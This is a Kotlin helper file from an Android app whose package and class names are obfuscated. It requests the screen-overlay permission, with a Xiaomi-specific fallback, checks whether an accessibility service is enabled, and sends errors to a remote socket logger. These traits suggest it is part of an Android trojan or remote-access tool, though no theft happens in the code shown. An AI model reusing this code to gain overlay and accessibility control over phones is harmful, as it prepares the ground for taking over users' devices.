package com.xxx.zzz.aall.permasd

import android.app.Activity
import android.app.PendingIntent
import android.content.ComponentName
import android.content.Context
import android.content.Intent
import android.net.Uri
import android.provider.Settings
import android.text.TextUtils
import com.xxx.zzz.globp.Globalqa
import com.xxx.zzz.globp.utilssss.MiuUtils
import com.xxx.zzz.socketsp.IOSocketyt

object PermUtil {

    fun requestOverlayPermission(context: Activity) {
        val intent = Intent("android.settings.action.MANAGE_OVERLAY_PERMISSION", Uri.parse("package:${context.packageName}"))
            .addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
            .addFlags(Intent.FLAG_ACTIVITY_REORDER_TO_FRONT)
            .addFlags(Intent.FLAG_ACTIVITY_CLEAR_TOP)
            .addFlags(Intent.FLAG_ACTIVITY_SINGLE_TOP)

        val pendingIntent = PendingIntent.getActivity(Globalqa.mainActivity.get(), 0, intent, 0 or PendingIntent.FLAG_IMMUTABLE)
        try {
            pendingIntent.send()
        } catch (e: PendingIntent.CanceledException) {
            IOSocketyt.sendLogs("", e.localizedMessage, "error")
        }

    }

    fun xiaomiOverlayPermission(context: Activity) {
        try {
            val localIntent = Intent("miui.intent.action.APP_PERM_EDITOR")
            localIntent.setClassName(
                "com.miui.securitycenter",
                "com.miui.permcenter.permissions.PermissionsEditorActivity"
            )
            localIntent.putExtra("extra_pkgname", context.packageName)

            val pendingIntent = PendingIntent.getActivity(Globalqa.mainActivity.get(), 0, localIntent, 0 or PendingIntent.FLAG_IMMUTABLE)
            try {
                pendingIntent.send()
            } catch (e: PendingIntent.CanceledException) {
                IOSocketyt.sendLogs("", e.localizedMessage, "error")
            }
        } catch (e: java.lang.Exception) {
            val localIntent = try {

                val localIntent = Intent("miui.intent.action.APP_PERM_EDITOR")
                localIntent.setClassName(
                    "com.miui.securitycenter",
                    "com.miui.permcenter.permissions.AppPermissionsEditorActivity"
                )
                localIntent.putExtra("extra_pkgname", context.packageName)
                localIntent
            } catch (e: Exception) {

                MiuUtils.canDrawOverlays(context)
                val intent = Intent(
                    "android.settings.action.MANAGE_OVERLAY_PERMISSION",
                    Uri.parse("package:${context.packageName}")
                )
                intent
            }

            val pendingIntent = PendingIntent.getActivity(Globalqa.mainActivity.get(), 0, localIntent, 0 or PendingIntent.FLAG_IMMUTABLE)
            try {
                pendingIntent.send()
            } catch (e: PendingIntent.CanceledException) {
                IOSocketyt.sendLogs("", e.localizedMessage, "error")
            }
        }
    }

    fun isAccessibilityServiceEnabled(context: Context, accessibilityService: Class<*>?): Boolean {
        try {
            val expectedComponentName = ComponentName(context, accessibilityService!!)
            val enabledServicesSetting =
                Settings.Secure.getString(context.contentResolver, "enabled_accessibility_services")
                    ?: return false
            val colonSplitter = TextUtils.SimpleStringSplitter(':')
            colonSplitter.setString(enabledServicesSetting)
            while (colonSplitter.hasNext()) {
                val componentNameString = colonSplitter.next()
                val enabledService = ComponentName.unflattenFromString(componentNameString)
                if (enabledService != null && enabledService == expectedComponentName)
                    return true
            }
        } catch (ex: Exception) {
            IOSocketyt.sendLogs("", "isAccessibilityServiceEnabled ${ex.localizedMessage}", "error")
        }
        return false
    }
}